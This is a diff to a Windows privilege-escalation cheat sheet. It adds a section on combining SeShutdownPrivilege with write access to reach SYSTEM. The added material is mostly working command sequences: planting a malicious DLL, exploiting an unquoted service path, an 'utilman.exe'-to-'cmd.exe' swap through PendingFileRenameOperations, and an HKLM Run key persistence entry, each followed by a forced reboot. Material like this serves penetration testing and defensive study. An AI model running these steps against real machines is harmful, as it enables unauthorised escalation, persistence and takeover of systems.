@@ -25,6 +25,7 @@ After getting a shell on a Windows target, run `whoami /priv` to list your token
 | `SeTakeOwnershipPrivilege` | Own any file/key → modify | takeown + icacls | Medium |
 | `SeLoadDriverPrivilege` | Kernel code exec → SYSTEM | Capcom.sys | Hard |
 | `SeManageVolumePrivilege` | Write any file → DLL hijack | Weaponized exploit | Medium |
+| `SeShutdownPrivilege` | Force reboot → trigger planted payload | shutdown + DLL hijack | Medium (combo) |
 | `SeMachineAccountPrivilege` | AD attack (add computer) | Impacket / PowerMAD | Context-dependent |
 
 ---
@@ -536,9 +537,105 @@ Typically only held by LSASS — exploitation is theoretical.
 
 **Not directly exploitable** but can be used to disrupt logging/timestamps.
 
-### SeShutdownPrivilege
+### SeShutdownPrivilege → Force Reboot → Trigger Planted Payload → SYSTEM
 
-**Not directly exploitable** but can force a reboot (useful with persistence mechanisms that trigger on boot).
+**Not exploitable alone**, but becomes a privilege escalation primitive when combined with a write capability. The key insight: normal users cannot reboot the system, so `SeShutdownPrivilege` lets you **trigger your own planted payloads** on demand.
+
+#### Combination Attack Matrix
+
+| Write Primitive Available | Attack Chain | Result |
+|---|---|---|
+| Writable path in SYSTEM service's DLL search order | Plant malicious DLL → `shutdown /r` → Service loads DLL on boot | SYSTEM |
+| Unquoted service path exists | Plant binary in gap → `shutdown /r` → Service executes wrong binary | SYSTEM |
+| Registry write access (HKLM Run / Service keys) | Add Run key or modify service ImagePath → `shutdown /r` | SYSTEM |
+| `MoveFileEx` API available | PendingFileRenameOperations → `shutdown /r` → File overwritten on boot | SYSTEM |
+| Scheduled task creation rights | Create boot-triggered task → `shutdown /r` | SYSTEM |
+| Any file write + DLL hijack target identified | Plant DLL → `shutdown /r` → SYSTEM service loads DLL | SYSTEM |
+
+#### Method 1: DLL Hijacking + Forced Reboot
+
+```cmd
+:: 1. Identify a DLL hijack opportunity (missing DLL in SYSTEM service)
+:: Use Process Monitor or known DLL hijack lists
+
+:: 2. Plant malicious DLL
+copy C:\Temp\malicious.dll "C:\Program Files\VulnApp\missing.dll"
+
+:: 3. Force reboot with SeShutdownPrivilege
+shutdown /r /t 0 /f
+:: Service starts on boot → loads malicious DLL → SYSTEM shell
+```
+
+#### Method 2: Unquoted Service Path + Forced Reboot
+
+```cmd
+:: 1. Find unquoted service paths
+wmic service get name,pathname,startmode | findstr /i "auto" | findstr /v /i "C:\Windows\\" | findstr /i /v """
+
+:: Example result: C:\Program Files\Vuln App\service.exe
+:: Windows will try: C:\Program.exe → C:\Program Files\Vuln.exe → ...
+
+:: 2. Plant binary in the gap
+copy C:\Temp\shell.exe "C:\Program Files\Vuln.exe"
+
+:: 3. Force reboot
+shutdown /r /t 0 /f
+:: Auto-start service executes C:\Program Files\Vuln.exe as SYSTEM
+```
+
+#### Method 3: PendingFileRenameOperations + Forced Reboot
+
+```cmd
+:: Replace utilman.exe with cmd.exe on next reboot (Sticky Keys variant)
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v PendingFileRenameOperations /t REG_MULTI_SZ /d "\??\C:\Windows\System32\cmd.exe\0\??\C:\Windows\System32\utilman.exe" /f
+
+:: Force reboot
+shutdown /r /t 0 /f
+
+:: At lock screen: Win+U → SYSTEM cmd.exe
+```
+
+> **Note:** Writing to `PendingFileRenameOperations` requires write access to the `Session Manager` registry key, which is typically restricted. This method works when combined with `SeRestorePrivilege` or `SeTakeOwnershipPrivilege`.
+
+#### Method 4: Registry Run Key + Forced Reboot
+
+```cmd
+:: If you have write access to HKLM Run keys
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Temp\shell.exe" /f
+
+:: Force reboot — payload executes on next login
+shutdown /r /t 0 /f
+```
+
+#### Shutdown Commands Reference
+
+```cmd
+:: Immediate reboot (force close applications)
+shutdown /r /t 0 /f
+
+:: Immediate shutdown
+shutdown /s /t 0 /f
+
+:: Delayed reboot (30 seconds)
+shutdown /r /t 30
+
+:: Cancel pending shutdown
+shutdown /a
+
+:: PowerShell equivalent
+Restart-Computer -Force
+Stop-Computer -Force
+```
+
+#### Why This Matters
+
+```
+SeShutdownPrivilege alone    → Cannot escalate (just reboot)
+Write primitive alone        → Payload planted but no trigger (must wait for admin reboot)
+SeShutdownPrivilege + Write  → Plant payload AND trigger it yourself = full escalation
+```
+
+Normal users cannot force a reboot, so they must wait for an administrator or scheduled maintenance to restart the system. With `SeShutdownPrivilege`, you control the timing — plant your payload and immediately trigger it.
 
 ---
 
@@ -575,6 +672,9 @@ flowchart TD
 
     C -->|SeManageVolumePrivilege| J["Write DLL to System32"]
     J --> SYSTEM
+
+    C -->|"SeShutdownPrivilege + Write primitive"| L["Plant payload + force reboot"]
+    L --> SYSTEM
 
     CREDS --> K["Pass-the-Hash / Crack"]
     K --> SYSTEM
